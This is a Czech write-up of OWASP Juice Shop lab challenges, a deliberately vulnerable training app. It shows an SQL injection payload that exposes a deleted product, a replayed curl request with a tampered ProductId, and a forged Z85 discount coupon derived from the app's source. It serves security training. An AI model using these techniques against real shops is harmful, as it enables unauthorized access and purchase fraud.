# OWASP Juice Shop – Vánoční speciál (2014) a podvržený 50% kupón (říjen 2026)

---

## 1. Průzkum vyhledávacího API a SQL injection

Frontend načítá produkty přes endpoint `/rest/products/search?q=<text>`. Do parametru `q` jsem vložil SQL injection payload, který by mohl obejít případnou podmínku filtrující nedostupné položky:

```
http://localhost:3000/rest/products/search?q=')) --
```

V JSON odpovědi se mezi standardními produkty objevil i „měkce smazaný“ vánoční speciál s **id 10**:
```json
{
	id:				10
	name:			"Christmas Super-Surprise-Box (2014 Edition)"
	description:	"Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)"
	price:			29.99
	deluxePrice:	29.99
	image:			"undefined.jpg"
	createdAt:		"2026-10-10 10:56:15.419 +00:00"
	updatedAt:		"2026-10-10 10:56:15.419 +00:00"
	deletedAt:		"2026-10-10 10:56:15.823 +00:00"
}
```

![Firefox – JSON odpověď endpointu /rest/products/search?q=')) -- s odhaleným produktem id 10 a vyplněným deletedAt](jewshop_1.jpg)

---

## 2. Zachycení legitimního požadavku na přidání do košíku

Otevřel jsem si záložku **Network** ve vývojářských nástrojích a přidal do košíku běžně dostupný produkt (Apple Juice), abych viděl přesný tvar požadavku, který frontend na server posílá.

![Network tab – zachycený POST požadavek na /api/BasketItems/ při přidání běžného produktu do košíku](jewshop_2.jpg)

Všiml jsem si, že se jedná o `POST /api/BasketItems/` s JSON tělem obsahujícím `ProductId`, `BasketId` a `quantity`. Samotné API žádnou kontrolu dostupnosti neprovádí – validace je jen na straně klienta.

---

## 3. Replay požadavku s upraveným ProductId

Tento požadavek jsem v prohlížeči zkopíroval jako `curl` příkaz (Copy as cURL) a spustil ho znovu v terminálu – tentokrát s `"ProductId":10`, tedy s ID vánočního speciálu zjištěným v kroku 1:

```bash
curl 'http://localhost:3000/api/BasketItems/' \
  -X POST \
  -H 'Authorization: Bearer <token z přihlášené session>' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: security_level=0; token=<...>; ...' \
  --data-raw '{"ProductId":10,"BasketId":"1","quantity":1}'
```

Server požadavek bez problémů přijal:

```json
{
  "status": "success",
  "data": {
    "id": 11,
    "ProductId": 10,
    "BasketId": "1",
    "quantity": 1,
    "createdAt": "2026-10-10T11:08:41.856Z"
  }
}
```

![Terminál – replay požadavku s upraveným ProductId 10, úspěšné přidání Christmas Super-Surprise-Boxu do košíku](jewshop_3.jpg)

Vánoční speciál se tak objevil v mém košíku vedle Apple Juice.

---

## 4. Analýza generování kupónů ve zdrojovém kódu

V nápovědě jsem nalezl, že kupón je možné buď zkusit hrubou silou, nebo ze zdrojového kódu. Podíval jsem se proto do oficiálního repozitáře projektu na GitHubu (`juice-shop/juice-shop`) a dohledal funkci `generateCoupon` v souboru `lib/insecurity.ts`:

![GitHub – zdrojový kód funkcí generateCoupon a discountFromCoupon v lib/insecurity.ts](jewshop_4.jpg)

```ts
export const generateCoupon = (discount: number, date = new Date()) => {
  const coupon = utils.toMMMYY(date) + '-' + discount
  return z85.encode(coupon)
}

export const discountFromCoupon = (coupon?: string) => {
  if (!coupon) return undefined
  const decoded = z85.decode(coupon)
  if (decoded && hasValidFormat(decoded.toString()) != null) {
    const parts = decoded.toString().split('-')
    const validity = parts[0]
    if (utils.toMMMYY(new Date()) === validity) {
      const discount = parts[1]
      return parseInt(discount)
    }
  }
}
```

Z kódu jsem zjistil:

- kupón vzniká spojením měsíce a roku ve formátu **`MMMYY`** (např. `OCT26`) a dvouciferné slevy v procentech, oddělených pomlčkou → `MMMYY-xx`,
- tento řetězec se zakóduje pomocí **Z85** kódování,
- při uplatnění (`discountFromCoupon`) server kupón dekóduje, ověří formát a porovná měsíc/rok s **svým aktuálním datem** – kupón proto platí jen v daném kalendářním měsíci.

Pro slevu 50 % platnou v říjnu 2026 jsem tedy potřeboval zakódovat řetězec:

```
OCT26-50
```

---

## 5. Zakódování řetězce do Z85

Protože jsem neměl po ruce žádnou knihovnu ani interpret, použil jsem online nástroj [cryptii.com](https://cryptii.com/pipes/z85-encoder/):

![cryptii.com – zakódování řetězce OCT26-50 do Z85, výsledek pEw8phz3^u](jewshop_5.jpg)

Vstup `OCT26-50` → výstup (podvržený kupón):

```
pEw8phz3^u
```

---

## 6. Uplatnění kupónu a dokončení objednávky

V sekci platby jsem rozbalil „Add a coupon“ a vložil vygenerovaný kód `pEw8phz3^u`.

![Payment Options – uplatněný podvržený kupón se slevou 50 %](jewshop_6.jpg)

Po dokončení objednávky aplikace potvrdila vyřešení výzvy a v souhrnu je vidět jak položka `Christmas Super-Surprise-Box (2014 Edition)`, tak uplatněná 50% sleva (Promotion −15.99¤, celková cena snížena z 32.48¤ na 16.49¤):

![Potvrzení objednávky – vyřešená výzva Christmas Special a aplikovaná 50% sleva](jewshop_7.jpg)

---
